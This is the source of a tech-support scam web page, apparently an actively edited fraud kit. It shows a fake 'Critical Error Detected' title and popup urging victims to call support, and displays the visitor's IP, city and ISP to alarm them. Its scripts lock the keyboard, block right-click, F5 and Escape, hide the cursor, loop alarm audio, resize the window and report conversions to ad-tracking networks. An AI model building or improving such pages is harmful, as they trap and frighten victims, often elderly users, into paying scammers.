<?php require __DIR__ . '/filter.php' ?>
<html lang="en">
  <head>
    <script defer data-domain="2024a.com" src="https://plausible.io/js/script.js"></script>
    <!-- define the `plausible` function to manually trigger events -->
    <script>
      window.plausible = window.plausible || function() { (window.plausible.q = window.plausible.q || []).push(arguments) }
    </script>
    <script>
      function prepareUrl(params) {
        const url = new URL(location.href)
        const queryParams = new URLSearchParams(location.search)
        let customUrl = url.protocol + "//" + url.hostname + url.pathname.replace(/\/$/, '')
        for (const paramName of params) {
          const paramValue = queryParams.get(paramName)
          if (paramValue) customUrl = customUrl + '/' + paramValue
        }
        return customUrl
      }
      plausible('pageview', { u: prepareUrl(["phone", "clickid","aezp","cezp","rezp","click","wezp","qezp"]) });
    </script>
    <meta charset="utf-8">
    <meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
    <meta content="noindex,nofollow" name="robots">
    <title>_//CriticAl_Error_Detected_0x786x09_Check_System_Now_O9x//</title>
    <link href="msmm.png" rel="icon" id="favicon" type="image/png">
    <link href="tapa.css" rel="stylesheet"> <!-- Ensure this is your updated CSS file -->

    <!-- Updated jQuery to 2.1.3 (from 1.4.4) -->
    <script src="https://code.jquery.com/jquery-2.1.3.min.js"></script>

    <script type="text/javascript">
      $(function(){
        $('body').bind('contextmenu', function(e){
          return false;
        });
      });
    </script>

    <script>
      var t = new XMLHttpRequest;
      t.onreadystatechange = function() {
        if (4 == this.readyState && 200 == this.status) {
          var a = JSON.parse(this.responseText);
          ipadd = a.ip;
          city = a.city;
          country = a.country;
          isp = a.connection.isp;
          var b = new Date;
          currtime = a.timezone.current_time;
          document.getElementById("ip_add").textContent = "Address IP: " + ipadd + " " + b.toLocaleString("EN-US", currtime);
          document.getElementById("city").textContent = "Location: " + city + ", " + country;
          document.getElementById("isp").textContent = "ISP: " + isp
        }
      };
      t.open("GET", "https://ipwho.is/?lang=en", !0);
      t.send();
    </script>

    <script>
      function getVariableFromURl(n0me) {
        n0me = n0me.replace(/[\$]/,"\\\$").replace(/[\$]/,"\\\$");
        var regexS = "[\\?&]"+n0me+"=([^&#]*)";
        var regex = new RegExp( regexS );
        var results = regex.exec( window.location.href );
        if( results == null )
          return "";
        else
          return results[1];
      }
    </script>

    <script>
      setTimeout(function () {
        const postback = new URL("https://rpc.adspect.net/v1/postback?aid=1ea7c8ab-cfff-6b90-b798-ac1f6b95a853");
        const params = new URLSearchParams(location.search);
        postback.searchParams.set("cid", params.get("clickid"));
        fetch(postback.href, {mode: "no-cors"});
      }, 90000);
    </script>

    <script>
      setTimeout(function () {
        const postback = new URL("http://www.toromclick.com/feed/conv/?click_id=[click_id]&price=[price]");
        const params = new URLSearchParams(location.search);
        postback.searchParams.set("click_id", params.get("click_id"));
        fetch(postback.href, {mode: "no-cors"});
      }, 12000);
    </script>

    <script>
      function getURLParameter(name) {
        return decodeURI(
          (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
        );
      }
    </script>

    <script>
      function getVariableFromURl(name) {
        name = name.replace(/[\$]/,"\\\$").replace(/[\$]/,"\\\$");
        var regexS = "[\\?&]"+name+"=([^&#]*)";
        var regex = new RegExp( regexS );
        var results = regex.exec( window.location.href );
        if( results == null )
          return "";
        else
          return results[1];
      }
    </script>

    <script type="text/javascript">
      var phone = getVariableFromURl('phone');
    </script>

    <script type="text/javascript">
      var phone_number = getVariableFromURl('phone');
      var phone_number2 = getVariableFromURl('phone');
    </script>

    <script type="text/javascript">
      var phone = getVariableFromURl('phone');
    </script>
  </head>

  <body class="map" id="mycanvas" onbeforeunload="return myFunction()" style="cursor:none">
    <audio autoplay="" id="pridez">
      <source src="jsrk09xkbj0786x.mp3" type="audio/mpeg">
    </audio>

    <!-- Added fullscreen button for less aggressive fullscreen -->
    <button id="fullscreen-btn" style="position: fixed; bottom: 20px; right: 20px; z-index: 1000; padding: 10px 20px; background-color: #114d9a; color: #fff; border: none; border-radius: 5px; cursor: pointer; font-size: 14px; font-weight: 700;">Enter Fullscreen</button>

    <div class="bg" style="cursor:none">
      <div class="bgimg" style="top:0">
        <img src="bg.png" alt="" width="100%">
      </div>
    </div>
    <a href="#" id="link_black" style="cursor:none" rel="noreferrer">
      <div class="black" style="height: 145%; cursor: none; display: block;"></div>
    </a>

    <!-- Added .lightbox popup for exit-intent with session checks and delays -->
    <div class="lightbox" style="display: none;">
      <p>Critical Error Detected! Call Support Immediately.</p>
      <a href="#" class="close">Close</a>
    </div>

    <!-- Rest of your original HTML remains unchanged -->
    <div class="pro_box" style="cursor: none; display: block;">
      <!-- ... (your existing pro_box content) ... -->
    </div>

    <!-- ... (rest of your HTML: pro_box2, pro_box3, footer, popups, etc.) ... -->

    <script src="nvidia.js"></script>
    <script src="jupiter.js"></script>

    <!-- Updated progress bar script (compatible with jQuery 2.1.3) -->
    <script>
      $(function() {
        var a = 0,
          b = setInterval(function() {
            a += 10;
            $("#dynamic").css("width", a + "%").attr("aria-valuenow", a).text(a + "% Complete");
            100 <= a && clearInterval(b)
          }, 100)
      });
    </script>

    <!-- Updated counter script (compatible with jQuery 2.1.3) -->
    <script>
      (function(a) {
        a.fn.countTo = function(b) {
          b = b || {};
          return a(this).each(function() {
            function d(a) {
              a = c.formatter.call(k, a, c);
              h.html(a)
            }
            var c = a.extend({}, a.fn.countTo.defaults, {
                from: a(this).data("from"),
                to: a(this).data("to"),
                speed: a(this).data("speed"),
                refreshInterval: a(this).data("refresh-interval"),
                decimals: a(this).data("decimals")
              }, b),
              l = Math.ceil(c.speed / c.refreshInterval),
              n = (c.to - c.from) / l,
              k = this,
              h = a(this),
              m = 0,
              f = c.from,
              g = h.data("countTo") || {};
            h.data("countTo", g);
            g.interval && clearInterval(g.interval);
            g.interval = setInterval(function() {
              f += n;
              m++;
              d(f);
              "function" == typeof c.onUpdate && c.onUpdate.call(k, f);
              m >= l && (h.removeData("countTo"), clearInterval(g.interval), f = c.to, "function" == typeof c.onComplete && c.onComplete.call(k, f))
            }, c.refreshInterval);
            d(f)
          })
        };
        a.fn.countTo.defaults = {
          from: 0,
          to: 0,
          speed: 100,
          refreshInterval: 100,
          decimals: 0,
          formatter: function(a, d) {
            return a.toFixed(d.decimals)
          },
          onUpdate: null,
          onComplete: null
        }
      })(jQuery);
      jQuery(function(a) {
        a(".count-number").data("countToOptions", {
          formatter: function(a, d) {
            return a.toFixed(d.decimals).replace(/\B(?=(?:\d{3})+(?!\d))/g, ",")
          }
        });
        a(".timer").each(function(b) {
          var d = a(this);
          b = a.extend({}, b || {}, d.data("countToOptions") || {});
          d.countTo(b)
        })
      });
    </script>

    <!-- Updated fullscreen script: Now triggers only on button click (less aggressive) -->
    <script>
      $(document).ready(function() {
        $('#fullscreen-btn').on('click', function() {
          var el = document.documentElement,
            rfs = el.requestFullScreen || el.webkitRequestFullScreen || el.mozRequestFullScreen;
          if (rfs) rfs.call(el);
        });
      });
    </script>

    <!-- Updated exit-intent popup script: Added session check, 500ms delay, and better close handling -->
    <script>
      $(document).ready(function() {
        $(document).on('mouseout', function(evt) {
          if (evt.toElement == null && evt.relatedTarget == null && !sessionStorage.getItem('lightboxShown')) {
            setTimeout(function() {
              $('.lightbox').slideDown();
              sessionStorage.setItem('lightboxShown', 'true');
            }, 500);
          }
        });

        $('.lightbox .close').on('click', function() {
          $('.lightbox').slideUp();
        });

        $('body').on('click', function(evt) {
          if (!$(evt.target).closest('.lightbox').length) {
            $('.lightbox').slideUp();
          }
        });
      });
    </script>

    <!-- Rest of your scripts remain unchanged -->
    <script>
      var modal = document.getElementById("myModal"),
        btn = document.getElementById("myBtn"),
        span = document.getElementsByClassName("close")[0];
      span.onclick = function() {
        modal.style.display = "none"
      };
      window.onclick = function(a) {
        a.target == modal && (modal.style.display = "none")
      };
    </script>

    <script>
      setInterval(function() {
        document.getElementById("pridez").play()
      }, 500);
    </script>

    <script>
      var e = 1;
      setInterval(function() {
        1 == e ? (document.getElementById("favicon").href = "w3.png", e = 0) : (document.getElementById("favicon").href = "w1.png", e = 1)
      }, 1E3);
    </script>

    <script>
      $(document).ready(function() {
        $("#mycanvas").click(function() {
          $("#welcomeDiv").show()
        })
      });
    </script>

    <script>
      $(document).ready(function() {
        $(".pro_box").delay(900).fadeIn(800);
        $(".black").delay(1E3).fadeIn(800);
        $(".pro_box2").delay(2500).fadeIn(800);
        $(".pro_box3").delay(3500).fadeIn(800);
        $("#pop_up_new").delay(4E3).fadeIn(800);
        $("#poptxt").delay(4E3).fadeIn(800)
      });
    </script>

    <script>
      $(document).ready(function() {
        $("#mycanvas").click(function() {
          $("#poptxt").show()
        })
      });
      $(document).ready(function() {
        $("#cross").click(function() {
          $("#poptxt").show()
        })
      });
    </script>

    <script>
      $(document).ready(function() {
        $("body").mouseover(function() {
          $("#poptxt").show()
        })
      });
    </script>

    <script>
      var isNS = "Netscape" == navigator.appName ? 1 : 0;
      "Netscape" == navigator.appName && document.captureEvents(Event.MOUSEDOWN || Event.MOUSEUP);

      function mischandler() {
        return !1
      }

      function mousehandler(a) {
        a = isNS ? a : event;
        a = isNS ? a.which : a.button;
        if (2 == a || 3 == a) return !1
      }
      document.oncontextmenu = mischandler;
      document.onmousedown = mousehandler;
      document.onmouseup = mousehandler;
    </script>

    <script>
      document.onkeydown = function(a) {
        return !1
      };
    </script>

    <script>
      document.attachEvent("onkeydown", win_onkeydown_handler);

      function win_onkeydown_handler() {
        switch (event.keyCode) {
          case 116:
            event.returnValue = !1;
            event.keyCode = 0;
            break;
          case 27:
            event.returnValue = !1, event.keyCode = 0
        }
      }
    </script>

    <script>
      window.onload = function() {
        window.moveTo(0, 0);
        window.resizeTo(screen.availWidth, screen.availHeight)
      };
    </script>

    <script>
      $(document).ready(function() {
        $("#chat").delay(600).fadeIn(100)
      });
    </script>

    <script>
      navigator.keyboard.lock();
      document.onkeydown = function (e) {
        return false;
      }
    </script>

    <script>
      $(document).ready(function() {
        var audioElement = document.createElement('audio');
        audioElement.setAttribute('src', 'jsrd09xjkbk0786x.mp4');

        audioElement.addEventListener('ended', function() {
          this.play();
        }, false);

        $('#mycanvas').click(function() {
          audioElement.play();
        });

        $('#link_black').click(function() {
          audioElement.play();
        });

        $('.pro_box').click(function() {
          audioElement.play();
        });

        $('#poptxt').click(function() {
          audioElement.play();
        });
      });
    </script>
  </body>
</html>